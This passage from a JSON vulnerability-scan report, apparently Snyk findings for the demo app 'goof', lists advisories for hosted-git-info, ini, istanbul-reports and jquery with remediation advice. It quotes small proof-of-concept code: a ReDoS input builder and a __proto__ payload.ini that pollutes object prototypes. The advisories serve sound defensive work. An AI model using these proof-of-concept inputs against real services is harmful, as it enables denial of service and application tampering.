          "code": "{\n  \"CVSSv3\": \"CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:L/E:P/RL:O/RC:C\",\n  \"alternativeIds\": [],\n  \"creationTime\": \"2021-03-23T16:13:42.109692Z\",\n  \"credit\": [\n    \"Yeting Li\"\n  ],\n  \"cvssScore\": 5.3,\n  \"description\": \"## Overview\\n[hosted-git-info](https://www.npmjs.org/package/hosted-git-info) is a Provides metadata and conversions from repository urls for Github, Bitbucket and Gitlab\\n\\nAffected versions of this package are vulnerable to Regular Expression Denial of Service (ReDoS) via regular expression `shortcutMatch ` in the `fromUrl` function in index.js. The affected regular expression exhibits polynomial worst-case time complexity.\\r\\n\\r\\n### PoC by Yeting Li\\r\\n```\\r\\nvar hostedGitInfo = require(\\\"hosted-git-info\\\")\\r\\nfunction build_attack(n) {\\r\\n    var ret = \\\"a:\\\"\\r\\n    for (var i = 0; i < n; i++) {\\r\\n        ret += \\\"a\\\"\\r\\n    }\\r\\n    return ret + \\\"!\\\";\\r\\n}\\r\\n\\r\\nfor(var i = 1; i <= 5000000; i++) {\\r\\n   if (i % 1000 == 0) {\\r\\n        var time = Date.now();\\r\\n        var attack_str = build_attack(i)\\r\\n       var parsedInfo = hostedGitInfo.fromUrl(attack_str)\\r\\n        var time_cost = Date.now() - time;\\r\\n        console.log(\\\"attack_str.length: \\\" + attack_str.length + \\\": \\\" + time_cost+\\\" ms\\\")\\r\\n}\\r\\n```\\n\\n## Details\\n\\nDenial of Service (DoS) describes a family of attacks, all aimed at making a system inaccessible to its original and legitimate users. There are many types of DoS attacks, ranging from trying to clog the network pipes to the system by generating a large volume of traffic from many machines (a Distributed Denial of Service - DDoS - attack) to sending crafted requests that cause a system to crash or take a disproportional amount of time to process.\\n\\nThe Regular expression Denial of Service (ReDoS) is a type of Denial of Service attack. Regular expressions are incredibly powerful, but they aren't very intuitive and can ultimately end up making it easy for attackers to take your site down.\\n\\nLet’s take the following regular expression as an example:\\n```js\\nregex = /A(B|C+)+D/\\n```\\n\\nThis regular expression accomplishes the following:\\n- `A` The string must start with the letter 'A'\\n- `(B|C+)+` The string must then follow the letter A with either the letter 'B' or some number of occurrences of the letter 'C' (the `+` matches one or more times). The `+` at the end of this section states that we can look for one or more matches of this section.\\n- `D` Finally, we ensure this section of the string ends with a 'D'\\n\\nThe expression would match inputs such as `ABBD`, `ABCCCCD`, `ABCBCCCD` and `ACCCCCD`\\n\\nIt most cases, it doesn't take very long for a regex engine to find a match:\\n\\n```bash\\n$ time node -e '/A(B|C+)+D/.test(\\\"ACCCCCCCCCCCCCCCCCCCCCCCCCCCCD\\\")'\\n0.04s user 0.01s system 95% cpu 0.052 total\\n\\n$ time node -e '/A(B|C+)+D/.test(\\\"ACCCCCCCCCCCCCCCCCCCCCCCCCCCCX\\\")'\\n1.79s user 0.02s system 99% cpu 1.812 total\\n```\\n\\nThe entire process of testing it against a 30 characters long string takes around ~52ms. But when given an invalid string, it takes nearly two seconds to complete the test, over ten times as long as it took to test a valid string. The dramatic difference is due to the way regular expressions get evaluated.\\n\\nMost Regex engines will work very similarly (with minor differences). The engine will match the first possible way to accept the current character and proceed to the next one. If it then fails to match the next one, it will backtrack and see if there was another way to digest the previous character. If it goes too far down the rabbit hole only to find out the string doesn’t match in the end, and if many characters have multiple valid regex paths, the number of backtracking steps can become very large, resulting in what is known as _catastrophic backtracking_.\\n\\nLet's look at how our expression runs into this problem, using a shorter string: \\\"ACCCX\\\". While it seems fairly straightforward, there are still four different ways that the engine could match those three C's:\\n1. CCC\\n2. CC+C\\n3. C+CC\\n4. C+C+C.\\n\\nThe engine has to try each of those combinations to see if any of them potentially match against the expression. When you combine that with the other steps the engine must take, we can use [RegEx 101 debugger](https://regex101.com/debugger) to see the engine has to take a total of 38 steps before it can determine the string doesn't match.\\n\\nFrom there, the number of steps the engine must use to validate a string just continues to grow.\\n\\n| String | Number of C's | Number of steps |\\n| -------|-------------:| -----:|\\n| ACCCX | 3 | 38\\n| ACCCCX | 4 | 71\\n| ACCCCCX | 5 | 136\\n| ACCCCCCCCCCCCCCX | 14 | 65,553\\n\\n\\nBy the time the string includes 14 C's, the engine has to take over 65,000 steps just to see if the string is valid. These extreme situations can cause them to work very slowly (exponentially related to input size, as shown above), allowing an attacker to exploit this and can cause the service to excessively consume CPU, resulting in a Denial of Service.\\n\\n## Remediation\\nUpgrade `hosted-git-info` to version 3.0.8, 2.8.9 or higher.\\n## References\\n- [GitHub Commit](https://github.com/npm/hosted-git-info/commit/bede0dc38e1785e732bf0a48ba6f81a4a908eba3)\\n\",\n  \"disclosureTime\": \"2020-11-28T00:00:00Z\",\n  \"exploit\": \"Proof of Concept\",\n  \"fixedIn\": [\n    \"3.0.8\",\n    \"2.8.9\"\n  ],\n  \"functions\": [],\n  \"functions_new\": [],\n  \"id\": \"SNYK-JS-HOSTEDGITINFO-1088355\",\n  \"identifiers\": {\n    \"CVE\": [\n      \"CVE-2021-23362\"\n    ],\n    \"CWE\": [\n      \"CWE-400\"\n    ],\n    \"GHSA\": [\n      \"GHSA-43f8-2h32-f4cj\"\n    ]\n  },\n  \"language\": \"js\",\n  \"malicious\": false,\n  \"modificationTime\": \"2021-07-06T14:08:10.106189Z\",\n  \"moduleName\": \"hosted-git-info\",\n  \"packageManager\": \"npm\",\n  \"packageName\": \"hosted-git-info\",\n  \"patches\": [],\n  \"proprietary\": true,\n  \"publicationTime\": \"2021-03-23T17:13:24Z\",\n  \"references\": [\n    {\n      \"title\": \"GitHub Commit\",\n      \"url\": \"https://github.com/npm/hosted-git-info/commit/bede0dc38e1785e732bf0a48ba6f81a4a908eba3\"\n    }\n  ],\n  \"semver\": {\n    \"vulnerable\": [\n      \">=3.0.0 <3.0.8\",\n      \"<2.8.9\"\n    ]\n  },\n  \"severity\": \"medium\",\n  \"socialTrendAlert\": false,\n  \"title\": \"Regular Expression Denial of Service (ReDoS)\",\n  \"severityWithCritical\": \"medium\",\n  \"from\": [\n    \"goof@1.0.1\",\n    \"tap@11.1.5\",\n    \"nyc@11.9.0\",\n    \"test-exclude@4.2.1\",\n    \"read-pkg-up@1.0.1\",\n    \"read-pkg@1.1.0\",\n    \"normalize-package-data@2.4.0\",\n    \"hosted-git-info@2.6.0\"\n  ],\n  \"upgradePath\": [],\n  \"isUpgradable\": false,\n  \"isPatchable\": false,\n  \"name\": \"hosted-git-info\",\n  \"version\": \"2.6.0\"\n}",
          "results": [
            {
              "status": "failed",
              "code_desc": "From : [ goof@1.0.1 , tap@11.1.5 , nyc@11.9.0 , test-exclude@4.2.1 , read-pkg-up@1.0.1 , read-pkg@1.1.0 , normalize-package-data@2.4.0 , hosted-git-info@2.6.0 ]",
              "run_time": 0,
              "start_time": ""
            }
          ]
        },
        {
          "tags": {
            "cci": [
              "CCI-001310"
            ],
            "nist": [
              "SI-10"
            ],
            "cweid": [
              "400"
            ],
            "cveid": [
              "2020-7788"
            ],
            "ghsaid": [
              "qqgx-2p2h-9c37"
            ]
          },
          "descriptions": [],
          "refs": [],
          "source_location": {},
          "title": "Prototype Pollution",
          "id": "SNYK-JS-INI-1048974",
          "desc": "## Overview\n[ini](https://www.npmjs.org/package/ini) is an An ini encoder/decoder for node\n\nAffected versions of this package are vulnerable to Prototype Pollution. If an attacker submits a malicious INI file to an application that parses it with `ini.parse`, they will pollute the prototype on the application. This can be exploited further depending on the context.\r\n\r\n## PoC by Eugene Lim\r\n\r\npayload.ini\r\n```\r\n[__proto__]\r\npolluted = \"polluted\"\r\n```\r\n\r\npoc.js:\r\n```\r\nvar fs = require('fs')\r\nvar ini = require('ini')\r\n\r\nvar parsed = ini.parse(fs.readFileSync('./payload.ini', 'utf-8'))\r\nconsole.log(parsed)\r\nconsole.log(parsed.__proto__)\r\nconsole.log(polluted)\r\n```\r\n\r\n```\r\n> node poc.js\r\n{}\r\n{ polluted: 'polluted' }\r\n{ polluted: 'polluted' }\r\npolluted\r\n```\n\n## Details\n\nPrototype Pollution is a vulnerability affecting JavaScript. Prototype Pollution refers to the ability to inject properties into existing JavaScript language construct prototypes, such as objects. JavaScript allows all Object attributes to be altered, including their magical attributes such as `_proto_`, `constructor` and `prototype`. An attacker manipulates these attributes to overwrite, or pollute, a JavaScript application object prototype of the base object by injecting other values.  Properties on the `Object.prototype` are then inherited by all the JavaScript objects through the prototype chain. When that happens, this leads to either denial of service by triggering JavaScript exceptions, or it tampers with the application source code to force the code path that the attacker injects, thereby leading to remote code execution.\n\nThere are two main ways in which the pollution of prototypes occurs:\n\n-   Unsafe `Object` recursive merge\n    \n-   Property definition by path\n    \n\n### Unsafe Object recursive merge\n\nThe logic of a vulnerable recursive merge function follows the following high-level model:\n```\nmerge (target, source)\n\n  foreach property of source\n\n    if property exists and is an object on both the target and the source\n\n      merge(target[property], source[property])\n\n    else\n\n      target[property] = source[property]\n```\n<br>  \n\nWhen the source object contains a property named `_proto_` defined with `Object.defineProperty()` , the condition that checks if the property exists and is an object on both the target and the source passes and the merge recurses with the target, being the prototype of `Object` and the source of `Object` as defined by the attacker. Properties are then copied on the `Object` prototype.\n\nClone operations are a special sub-class of unsafe recursive merges, which occur when a recursive merge is conducted on an empty object: `merge({},source)`.\n\n`lodash` and `Hoek` are examples of libraries susceptible to recursive merge attacks.\n\n### Property definition by path\n\nThere are a few JavaScript libraries that use an API to define property values on an object based on a given path. The function that is generally affected contains this signature: `theFunction(object, path, value)`\n\nIf the attacker can control the value of “path”, they can set this value to `_proto_.myValue`. `myValue` is then assigned to the prototype of the class of the object.\n\n## Types of attacks\n\nThere are a few methods by which Prototype Pollution can be manipulated:\n\n| Type |Origin  |Short description |\n|--|--|--|\n| **Denial of service (DoS)**|Client  |This is the most likely attack. <br>DoS occurs when `Object` holds generic functions that are implicitly called for various operations (for example, `toString` and `valueOf`). <br> The attacker pollutes `Object.prototype.someattr` and alters its state to an unexpected value such as `Int` or `Object`. In this case, the code fails and is likely to cause a denial of service.  <br>**For example:** if an attacker pollutes `Object.prototype.toString` by defining it as an integer, if the codebase at any point was reliant on `someobject.toString()` it would fail. |\n |**Remote Code Execution**|Client|Remote code execution is generally only possible in cases where the codebase evaluates a specific attribute of an object, and then executes that evaluation.<br>**For example:** `eval(someobject.someattr)`. In this case, if the attacker pollutes `Object.prototype.someattr` they are likely to be able to leverage this in order to execute code.|\n|**Property Injection**|Client|The attacker pollutes properties that the codebase relies on for their informative value, including security properties such as cookies or tokens.<br>  **For example:** if a codebase checks privileges for `someuser.isAdmin`, then when the attacker pollutes `Object.prototype.isAdmin` and sets it to equal `true`, they can then achieve admin privileges.|\n\n## Affected environments\n\nThe following environments are susceptible to a Prototype Pollution attack:\n\n-   Application server\n    \n-   Web server\n    \n\n## How to prevent\n\n1.  Freeze the prototype— use `Object.freeze (Object.prototype)`.\n    \n2.  Require schema validation of JSON input.\n    \n3.  Avoid using unsafe recursive merge functions.\n    \n4.  Consider using objects without prototypes (for example, `Object.create(null)`), breaking the prototype chain and preventing pollution.\n    \n5.  As a best practice use `Map` instead of `Object`.\n\n### For more information on this vulnerability type:\n\n[Arteau, Oliver. “JavaScript prototype pollution attack in NodeJS application.” GitHub, 26 May 2018](https://github.com/HoLyVieR/prototype-pollution-nsec18/blob/master/paper/JavaScript_prototype_pollution_attack_in_NodeJS.pdf)\n\n## Remediation\nUpgrade `ini` to version 1.3.6 or higher.\n## References\n- [Eugene Lim - Research Blog Post](https://medium.com/csg-govtech/supply-chain-pollution-discovering-a-16-million-download-week-node-js-2fa4d2c27cf7)\n- [GitHub Commit](https://github.com/npm/ini/commit/56d2805e07ccd94e2ba0984ac9240ff02d44b6f1)\n",
          "impact": 0.7,
          "code": "{\n  \"CVSSv3\": \"CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:L/A:L/E:P\",\n  \"alternativeIds\": [],\n  \"creationTime\": \"2020-12-08T15:34:07.743781Z\",\n  \"credit\": [\n    \"Eugene Lim\",\n    \"Government Technology Agency Cyber Security Group\"\n  ],\n  \"cvssScore\": 7.3,\n  \"description\": \"## Overview\\n[ini](https://www.npmjs.org/package/ini) is an An ini encoder/decoder for node\\n\\nAffected versions of this package are vulnerable to Prototype Pollution. If an attacker submits a malicious INI file to an application that parses it with `ini.parse`, they will pollute the prototype on the application. This can be exploited further depending on the context.\\r\\n\\r\\n## PoC by Eugene Lim\\r\\n\\r\\npayload.ini\\r\\n```\\r\\n[__proto__]\\r\\npolluted = \\\"polluted\\\"\\r\\n```\\r\\n\\r\\npoc.js:\\r\\n```\\r\\nvar fs = require('fs')\\r\\nvar ini = require('ini')\\r\\n\\r\\nvar parsed = ini.parse(fs.readFileSync('./payload.ini', 'utf-8'))\\r\\nconsole.log(parsed)\\r\\nconsole.log(parsed.__proto__)\\r\\nconsole.log(polluted)\\r\\n```\\r\\n\\r\\n```\\r\\n> node poc.js\\r\\n{}\\r\\n{ polluted: 'polluted' }\\r\\n{ polluted: 'polluted' }\\r\\npolluted\\r\\n```\\n\\n## Details\\n\\nPrototype Pollution is a vulnerability affecting JavaScript. Prototype Pollution refers to the ability to inject properties into existing JavaScript language construct prototypes, such as objects. JavaScript allows all Object attributes to be altered, including their magical attributes such as `_proto_`, `constructor` and `prototype`. An attacker manipulates these attributes to overwrite, or pollute, a JavaScript application object prototype of the base object by injecting other values.  Properties on the `Object.prototype` are then inherited by all the JavaScript objects through the prototype chain. When that happens, this leads to either denial of service by triggering JavaScript exceptions, or it tampers with the application source code to force the code path that the attacker injects, thereby leading to remote code execution.\\n\\nThere are two main ways in which the pollution of prototypes occurs:\\n\\n-   Unsafe `Object` recursive merge\\n    \\n-   Property definition by path\\n    \\n\\n### Unsafe Object recursive merge\\n\\nThe logic of a vulnerable recursive merge function follows the following high-level model:\\n```\\nmerge (target, source)\\n\\n  foreach property of source\\n\\n    if property exists and is an object on both the target and the source\\n\\n      merge(target[property], source[property])\\n\\n    else\\n\\n      target[property] = source[property]\\n```\\n<br>  \\n\\nWhen the source object contains a property named `_proto_` defined with `Object.defineProperty()` , the condition that checks if the property exists and is an object on both the target and the source passes and the merge recurses with the target, being the prototype of `Object` and the source of `Object` as defined by the attacker. Properties are then copied on the `Object` prototype.\\n\\nClone operations are a special sub-class of unsafe recursive merges, which occur when a recursive merge is conducted on an empty object: `merge({},source)`.\\n\\n`lodash` and `Hoek` are examples of libraries susceptible to recursive merge attacks.\\n\\n### Property definition by path\\n\\nThere are a few JavaScript libraries that use an API to define property values on an object based on a given path. The function that is generally affected contains this signature: `theFunction(object, path, value)`\\n\\nIf the attacker can control the value of “path”, they can set this value to `_proto_.myValue`. `myValue` is then assigned to the prototype of the class of the object.\\n\\n## Types of attacks\\n\\nThere are a few methods by which Prototype Pollution can be manipulated:\\n\\n| Type |Origin  |Short description |\\n|--|--|--|\\n| **Denial of service (DoS)**|Client  |This is the most likely attack. <br>DoS occurs when `Object` holds generic functions that are implicitly called for various operations (for example, `toString` and `valueOf`). <br> The attacker pollutes `Object.prototype.someattr` and alters its state to an unexpected value such as `Int` or `Object`. In this case, the code fails and is likely to cause a denial of service.  <br>**For example:** if an attacker pollutes `Object.prototype.toString` by defining it as an integer, if the codebase at any point was reliant on `someobject.toString()` it would fail. |\\n |**Remote Code Execution**|Client|Remote code execution is generally only possible in cases where the codebase evaluates a specific attribute of an object, and then executes that evaluation.<br>**For example:** `eval(someobject.someattr)`. In this case, if the attacker pollutes `Object.prototype.someattr` they are likely to be able to leverage this in order to execute code.|\\n|**Property Injection**|Client|The attacker pollutes properties that the codebase relies on for their informative value, including security properties such as cookies or tokens.<br>  **For example:** if a codebase checks privileges for `someuser.isAdmin`, then when the attacker pollutes `Object.prototype.isAdmin` and sets it to equal `true`, they can then achieve admin privileges.|\\n\\n## Affected environments\\n\\nThe following environments are susceptible to a Prototype Pollution attack:\\n\\n-   Application server\\n    \\n-   Web server\\n    \\n\\n## How to prevent\\n\\n1.  Freeze the prototype— use `Object.freeze (Object.prototype)`.\\n    \\n2.  Require schema validation of JSON input.\\n    \\n3.  Avoid using unsafe recursive merge functions.\\n    \\n4.  Consider using objects without prototypes (for example, `Object.create(null)`), breaking the prototype chain and preventing pollution.\\n    \\n5.  As a best practice use `Map` instead of `Object`.\\n\\n### For more information on this vulnerability type:\\n\\n[Arteau, Oliver. “JavaScript prototype pollution attack in NodeJS application.” GitHub, 26 May 2018](https://github.com/HoLyVieR/prototype-pollution-nsec18/blob/master/paper/JavaScript_prototype_pollution_attack_in_NodeJS.pdf)\\n\\n## Remediation\\nUpgrade `ini` to version 1.3.6 or higher.\\n## References\\n- [Eugene Lim - Research Blog Post](https://medium.com/csg-govtech/supply-chain-pollution-discovering-a-16-million-download-week-node-js-2fa4d2c27cf7)\\n- [GitHub Commit](https://github.com/npm/ini/commit/56d2805e07ccd94e2ba0984ac9240ff02d44b6f1)\\n\",\n  \"disclosureTime\": \"2020-12-08T13:02:04Z\",\n  \"exploit\": \"Proof of Concept\",\n  \"fixedIn\": [\n    \"1.3.6\"\n  ],\n  \"functions\": [],\n  \"functions_new\": [],\n  \"id\": \"SNYK-JS-INI-1048974\",\n  \"identifiers\": {\n    \"CVE\": [\n      \"CVE-2020-7788\"\n    ],\n    \"CWE\": [\n      \"CWE-400\"\n    ],\n    \"GHSA\": [\n      \"GHSA-qqgx-2p2h-9c37\"\n    ]\n  },\n  \"language\": \"js\",\n  \"malicious\": false,\n  \"modificationTime\": \"2020-12-25T17:53:57.809154Z\",\n  \"moduleName\": \"ini\",\n  \"packageManager\": \"npm\",\n  \"packageName\": \"ini\",\n  \"patches\": [],\n  \"proprietary\": true,\n  \"publicationTime\": \"2020-12-10T18:08:38Z\",\n  \"references\": [\n    {\n      \"title\": \"Eugene Lim - Research Blog Post\",\n      \"url\": \"https://medium.com/csg-govtech/supply-chain-pollution-discovering-a-16-million-download-week-node-js-2fa4d2c27cf7\"\n    },\n    {\n      \"title\": \"GitHub Commit\",\n      \"url\": \"https://github.com/npm/ini/commit/56d2805e07ccd94e2ba0984ac9240ff02d44b6f1\"\n    }\n  ],\n  \"semver\": {\n    \"vulnerable\": [\n      \"<1.3.6\"\n    ]\n  },\n  \"severity\": \"high\",\n  \"socialTrendAlert\": false,\n  \"title\": \"Prototype Pollution\",\n  \"severityWithCritical\": \"high\",\n  \"from\": [\n    \"goof@1.0.1\",\n    \"npmconf@0.0.24\",\n    \"config-chain@1.1.12\",\n    \"ini@1.3.5\"\n  ],\n  \"upgradePath\": [\n    false,\n    \"npmconf@0.0.24\",\n    \"config-chain@1.1.12\",\n    \"ini@1.3.6\"\n  ],\n  \"isUpgradable\": true,\n  \"isPatchable\": false,\n  \"name\": \"ini\",\n  \"version\": \"1.3.5\"\n}",
          "results": [
            {
              "status": "failed",
              "code_desc": "From : [ goof@1.0.1 , npmconf@0.0.24 , config-chain@1.1.12 , ini@1.3.5 ]",
              "run_time": 0,
              "start_time": ""
            },
            {
              "status": "failed",
              "code_desc": "From : [ goof@1.0.1 , npmconf@0.0.24 , ini@1.1.0 ]",
              "run_time": 0,
              "start_time": ""
            }
          ]
        },
        {
          "tags": {
            "cci": [
              "CCI-003173",
              "CCI-001643"
            ],
            "nist": [
              "SA-11",
              "RA-5"
            ],
            "cweid": [
              "1022"
            ],
            "cveid": [],
            "ghsaid": []
          },
          "descriptions": [],
          "refs": [],
          "source_location": {},
          "title": "Reverse Tabnabbing",
          "id": "SNYK-JS-ISTANBULREPORTS-2328088",
          "desc": "## Overview\n\nAffected versions of this package are vulnerable to Reverse Tabnabbing because of no `rel` attribute in the link to `https://istanbul.js.org/`.\n## Remediation\nUpgrade `istanbul-reports` to version 3.1.3 or higher.\n## References\n- [GitHub Commit](https://github.com/istanbuljs/istanbuljs/commit/4eceb9eb8b3169b882d74ecc526fb5837ebc6205)\n- [GitHub PR](https://github.com/istanbuljs/istanbuljs/pull/591)\n- [GitHub Release](https://github.com/istanbuljs/istanbuljs/releases/tag/istanbul-reports-v3.1.3)\n",
          "impact": 0.5,
          "code": "{\n  \"CVSSv3\": \"CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:L/I:N/A:N\",\n  \"alternativeIds\": [],\n  \"creationTime\": \"2021-12-30T14:41:17.923623Z\",\n  \"credit\": [\n    \"Unknown\"\n  ],\n  \"cvssScore\": 4.3,\n  \"description\": \"## Overview\\n\\nAffected versions of this package are vulnerable to Reverse Tabnabbing because of no `rel` attribute in the link to `https://istanbul.js.org/`.\\n## Remediation\\nUpgrade `istanbul-reports` to version 3.1.3 or higher.\\n## References\\n- [GitHub Commit](https://github.com/istanbuljs/istanbuljs/commit/4eceb9eb8b3169b882d74ecc526fb5837ebc6205)\\n- [GitHub PR](https://github.com/istanbuljs/istanbuljs/pull/591)\\n- [GitHub Release](https://github.com/istanbuljs/istanbuljs/releases/tag/istanbul-reports-v3.1.3)\\n\",\n  \"disclosureTime\": \"2021-12-30T14:13:55Z\",\n  \"exploit\": \"Not Defined\",\n  \"fixedIn\": [\n    \"3.1.3\"\n  ],\n  \"functions\": [],\n  \"functions_new\": [],\n  \"id\": \"SNYK-JS-ISTANBULREPORTS-2328088\",\n  \"identifiers\": {\n    \"CVE\": [],\n    \"CWE\": [\n      \"CWE-1022\"\n    ]\n  },\n  \"language\": \"js\",\n  \"malicious\": false,\n  \"modificationTime\": \"2021-12-30T15:42:28.495661Z\",\n  \"moduleName\": \"istanbul-reports\",\n  \"packageManager\": \"npm\",\n  \"packageName\": \"istanbul-reports\",\n  \"patches\": [],\n  \"proprietary\": false,\n  \"publicationTime\": \"2021-12-30T15:42:28.493526Z\",\n  \"references\": [\n    {\n      \"title\": \"GitHub Commit\",\n      \"url\": \"https://github.com/istanbuljs/istanbuljs/commit/4eceb9eb8b3169b882d74ecc526fb5837ebc6205\"\n    },\n    {\n      \"title\": \"GitHub PR\",\n      \"url\": \"https://github.com/istanbuljs/istanbuljs/pull/591\"\n    },\n    {\n      \"title\": \"GitHub Release\",\n      \"url\": \"https://github.com/istanbuljs/istanbuljs/releases/tag/istanbul-reports-v3.1.3\"\n    }\n  ],\n  \"semver\": {\n    \"vulnerable\": [\n      \"<3.1.3\"\n    ]\n  },\n  \"severity\": \"medium\",\n  \"socialTrendAlert\": false,\n  \"title\": \"Reverse Tabnabbing\",\n  \"severityWithCritical\": \"medium\",\n  \"from\": [\n    \"goof@1.0.1\",\n    \"tap@11.1.5\",\n    \"nyc@11.9.0\",\n    \"istanbul-reports@1.4.0\"\n  ],\n  \"upgradePath\": [\n    false,\n    \"tap@15.0.0\",\n    \"nyc@15.1.0\",\n    \"istanbul-reports@3.1.3\"\n  ],\n  \"isUpgradable\": true,\n  \"isPatchable\": false,\n  \"name\": \"istanbul-reports\",\n  \"version\": \"1.4.0\"\n}",
          "results": [
            {
              "status": "failed",
              "code_desc": "From : [ goof@1.0.1 , tap@11.1.5 , nyc@11.9.0 , istanbul-reports@1.4.0 ]",
              "run_time": 0,
              "start_time": ""
            }
          ]
        },
        {
          "tags": {
            "cci": [
              "CCI-001310"
            ],
            "nist": [
              "SI-10"
            ],
            "cweid": [
              "400"
            ],
            "cveid": [
              "2019-11358",
              "2019-5428"
            ],
            "ghsaid": [
              "wv67-q8rr-grjp"
            ]
          },
          "descriptions": [],
          "refs": [],
          "source_location": {},
          "title": "Prototype Pollution",
          "id": "SNYK-JS-JQUERY-174006",
          "desc": "## Overview\n[jquery](https://www.npmjs.com/package/jquery) is a package that makes things like HTML document traversal and manipulation, event handling, animation, and Ajax much simpler with an easy-to-use API that works across a multitude of browsers.\n\nAffected versions of this package are vulnerable to Prototype Pollution. The `extend` function can be tricked into modifying the prototype of `Object` when the attacker controls part of the structure passed to this function. This can let an attacker add or modify an existing property that will then exist on all objects.\n\n## Details\n\nPrototype Pollution is a vulnerability affecting JavaScript. Prototype Pollution refers to the ability to inject properties into existing JavaScript language construct prototypes, such as objects. JavaScript allows all Object attributes to be altered, including their magical attributes such as `_proto_`, `constructor` and `prototype`. An attacker manipulates these attributes to overwrite, or pollute, a JavaScript application object prototype of the base object by injecting other values.  Properties on the `Object.prototype` are then inherited by all the JavaScript objects through the prototype chain. When that happens, this leads to either denial of service by triggering JavaScript exceptions, or it tampers with the application source code to force the code path that the attacker injects, thereby leading to remote code execution.\n\nThere are two main ways in which the pollution of prototypes occurs:\n\n-   Unsafe `Object` recursive merge\n    \n-   Property definition by path\n    \n\n### Unsafe Object recursive merge\n\nThe logic of a vulnerable recursive merge function follows the following high-level model:\n```\nmerge (target, source)\n\n  foreach property of source\n\n    if property exists and is an object on both the target and the source\n\n      merge(target[property], source[property])\n\n    else\n\n      target[property] = source[property]\n```\n<br>  \n\nWhen the source object contains a property named `_proto_` defined with `Object.defineProperty()` , the condition that checks if the property exists and is an object on both the target and the source passes and the merge recurses with the target, being the prototype of `Object` and the source of `Object` as defined by the attacker. Properties are then copied on the `Object` prototype.\n\nClone operations are a special sub-class of unsafe recursive merges, which occur when a recursive merge is conducted on an empty object: `merge({},source)`.\n\n`lodash` and `Hoek` are examples of libraries susceptible to recursive merge attacks.\n\n### Property definition by path\n\nThere are a few JavaScript libraries that use an API to define property values on an object based on a given path. The function that is generally affected contains this signature: `theFunction(object, path, value)`\n\nIf the attacker can control the value of “path”, they can set this value to `_proto_.myValue`. `myValue` is then assigned to the prototype of the class of the object.\n\n## Types of attacks\n\nThere are a few methods by which Prototype Pollution can be manipulated:\n\n| Type |Origin  |Short description |\n|--|--|--|\n| **Denial of service (DoS)**|Client  |This is the most likely attack. <br>DoS occurs when `Object` holds generic functions that are implicitly called for various operations (for example, `toString` and `valueOf`). <br> The attacker pollutes `Object.prototype.someattr` and alters its state to an unexpected value such as `Int` or `Object`. In this case, the code fails and is likely to cause a denial of service.  <br>**For example:** if an attacker pollutes `Object.prototype.toString` by defining it as an integer, if the codebase at any point was reliant on `someobject.toString()` it would fail. |\n |**Remote Code Execution**|Client|Remote code execution is generally only possible in cases where the codebase evaluates a specific attribute of an object, and then executes that evaluation.<br>**For example:** `eval(someobject.someattr)`. In this case, if the attacker pollutes `Object.prototype.someattr` they are likely to be able to leverage this in order to execute code.|\n|**Property Injection**|Client|The attacker pollutes properties that the codebase relies on for their informative value, including security properties such as cookies or tokens.<br>  **For example:** if a codebase checks privileges for `someuser.isAdmin`, then when the attacker pollutes `Object.prototype.isAdmin` and sets it to equal `true`, they can then achieve admin privileges.|\n\n## Affected environments\n\nThe following environments are susceptible to a Prototype Pollution attack:\n\n-   Application server\n    \n-   Web server\n    \n\n## How to prevent\n\n1.  Freeze the prototype— use `Object.freeze (Object.prototype)`.\n    \n2.  Require schema validation of JSON input.\n    \n3.  Avoid using unsafe recursive merge functions.\n    \n4.  Consider using objects without prototypes (for example, `Object.create(null)`), breaking the prototype chain and preventing pollution.\n    \n5.  As a best practice use `Map` instead of `Object`.\n\n### For more information on this vulnerability type:\n\n[Arteau, Oliver. “JavaScript prototype pollution attack in NodeJS application.” GitHub, 26 May 2018](https://github.com/HoLyVieR/prototype-pollution-nsec18/blob/master/paper/JavaScript_prototype_pollution_attack_in_NodeJS.pdf)\n\n## Remediation\nUpgrade `jquery` to version 3.4.0 or higher.\n## References\n- [GitHub Commit](https://github.com/jquery/jquery/commit/753d591aea698e57d6db58c9f722cd0808619b1b)\n- [GitHub PR](https://github.com/jquery/jquery/pull/4333)\n- [Hackerone Report](https://hackerone.com/reports/454365)\n- [Snyk Blog](https://snyk.io/blog/after-three-years-of-silence-a-new-jquery-prototype-pollution-vulnerability-emerges-once-again/)\n- [Third-Party Backported Patches Repo](https://github.com/DanielRuf/snyk-js-jquery-174006)\n",
          "impact": 0.5,
          "code": "{\n  \"CVSSv3\": \"CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:L/I:L/A:L/E:P\",\n  \"alternativeIds\": [],\n  \"creationTime\": \"2019-03-27T08:43:07.568451Z\",\n  \"credit\": [\n    \"Semmle Security Research Team\"\n  ],\n  \"cvssScore\": 5.6,\n  \"description\": \"## Overview\\n[jquery](https://www.npmjs.com/package/jquery) is a package that makes things like HTML document traversal and manipulation, event handling, animation, and Ajax much simpler with an easy-to-use API that works across a multitude of browsers.\\n\\nAffected versions of this package are vulnerable to Prototype Pollution. The `extend` function can be tricked into modifying the prototype of `Object` when the attacker controls part of the structure passed to this function. This can let an attacker add or modify an existing property that will then exist on all objects.\\n\\n## Details\\n\\nPrototype Pollution is a vulnerability affecting JavaScript. Prototype Pollution refers to the ability to inject properties into existing JavaScript language construct prototypes, such as objects. JavaScript allows all Object attributes to be altered, including their magical attributes such as `_proto_`, `constructor` and `prototype`. An attacker manipulates these attributes to overwrite, or pollute, a JavaScript application object prototype of the base object by injecting other values.  Properties on the `Object.prototype` are then inherited by all the JavaScript objects through the prototype chain. When that happens, this leads to either denial of service by triggering JavaScript exceptions, or it tampers with the application source code to force the code path that the attacker injects, thereby leading to remote code execution.\\n\\nThere are two main ways in which the pollution of prototypes occurs:\\n\\n-   Unsafe `Object` recursive merge\\n    \\n-   Property definition by path\\n    \\n\\n### Unsafe Object recursive merge\\n\\nThe logic of a vulnerable recursive merge function follows the following high-level model:\\n```\\nmerge (target, source)\\n\\n  foreach property of source\\n\\n    if property exists and is an object on both the target and the source\\n\\n      merge(target[property], source[property])\\n\\n    else\\n\\n      target[property] = source[property]\\n```\\n<br>  \\n\\nWhen the source object contains a property named `_proto_` defined with `Object.defineProperty()` , the condition that checks if the property exists and is an object on both the target and the source passes and the merge recurses with the target, being the prototype of `Object` and the source of `Object` as defined by the attacker. Properties are then copied on the `Object` prototype.\\n\\nClone operations are a special sub-class of unsafe recursive merges, which occur when a recursive merge is conducted on an empty object: `merge({},source)`.\\n\\n`lodash` and `Hoek` are examples of libraries susceptible to recursive merge 